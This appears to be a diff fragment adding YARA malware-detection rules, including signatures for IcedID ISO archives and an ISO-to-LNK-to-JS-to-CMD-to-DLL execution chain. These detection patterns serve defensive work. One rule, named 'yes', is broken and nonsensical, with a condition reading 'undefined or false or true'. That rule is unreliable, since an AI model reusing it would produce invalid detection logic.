+		$2 = {3030BCADEFA9EEACAAA7B8303DF3F3F0A9EF4530FDE8A4FD30F9F3AAEEEC3E30B3F29D9DECEA3533EFA4B030FB303AA6E63930B4AB9AA2A69DF0A9B9BC3530EEE800443040AEF2F1F2AA4130FAADADEFEDEE3930B9A4}
+		$3 = {6B58758787BCBBB5AEEEA7A6ECAAAF726870837070696D8B8C8673A08A8A84858B99F3A8A5A69C79737486A0ABECEDABB08377736D6D6B58758787BCBBB5AEEFA79AEA95AC8A7B7269736D748D8DBAB3AAEBEB9C919370}
+		$4 = {606C4F0A0A0A0A4B5B63666C0A0A0A0A5F62}
+		$5 = {596A78490A0A0A4C5E524A0A0A0A0A0A4E70}
+		$6 = {5C5F540A0A0A0A4E565A5C605971715652}
+		$7 = {646A780A0A0A474C490A0A0A0A0A0A4B73}
+		$8 = {5C6C510A0A0A0A0A0A4B515C59666770}
+	condition:
+		all of them
+}rule yes
+{
+
+	meta:
+		date = "2023-07-24"
+		yarahub_uuid = "aad162a4-d304-423e-b478-ae82f28691d7"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "7d066ca5aabee7ca02095468d7cb5202"
+	strings:
+
+		$a = "0"
+
+		$b = "0" wide ascii
+		$c = "0" wide
+		$d = "1"
+		$d1 = "1" wide
+		$d2 = "1" wide ascii
+		$d3 = "true"
+		$d4 = "false"
+		$d5 = "true" wide ascii
+		$d6 = "false" wide ascii
+		$d7 = "true" wide
+		$d8 = "false" wide
+	condition:
+
+		undefined or false or true
+}
+rule IcedID_ISO {
+
+  meta:
+      author = "Ankit Anubhav - ankitanubhav.info"
+      description = "Detects IcedID ISO archives"
+      date = "2022-08-18"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
+      yarahub_reference_md5 = "d5f065d3ac9dc75041af218718f4950e"
+      yarahub_uuid = "53d04c1d-fd1a-4928-ae92-adfcc62dc029"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.icedid"
+
+strings:
+
+
+	$iso = "This disc contains"
+	$exe = "This program cannot be run"
+	$txrun = {74 78 74 2c 22}
+
+condition:
+	$iso and $exe and $txrun and filesize < 999999
+
+
+}
+rule ISO_LNK_JS_CMD_DLL {
+   meta:
+      description = "Detects iso > lnk > js > cmd > dll execution chain"
+      author = "_jc"
+      date = "2022-09-29"
+      yarahub_reference_md5 = "b93bd94b8f568deac0143bf93f7d8bd8"
+      yarahub_uuid = "3e54dac2-910d-4dda-a3b4-2fa052556be7"
+      yarahub_license = "CC BY 4.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+   strings:
+      $lnk_header = { 4C 00 }
+	  $minimized_inactive = {07}
+	  $js_ext = ".js" nocase
+
+	  $echo_off = { 40 65 63 68 6F [32-64] 33 32} // "@echo..32" to catch .cmd + regsvr32 stitching
+
+	  $js_var = {76 61 72 [1-32] 3D [1-16] 3B} // catches javascript-style variable declaration
+
+	  $mz_dos_mode = {4D 5A [100-110] 44 4F 53 20 6D 6F 64 65} // catches MZ..DOS Mode
+
+   condition:
+      // spot minimized_inactive flag; invocation of .js file by lnk
+	  $echo_off and $js_var and $mz_dos_mode and
+      for any i in (1..#lnk_header):
+	  (($minimized_inactive in (@lnk_header[i]+60..@lnk_header[i]+61)) and ($js_ext in (@lnk_header[i]+255..@lnk_header[i]+304)))
+}
 
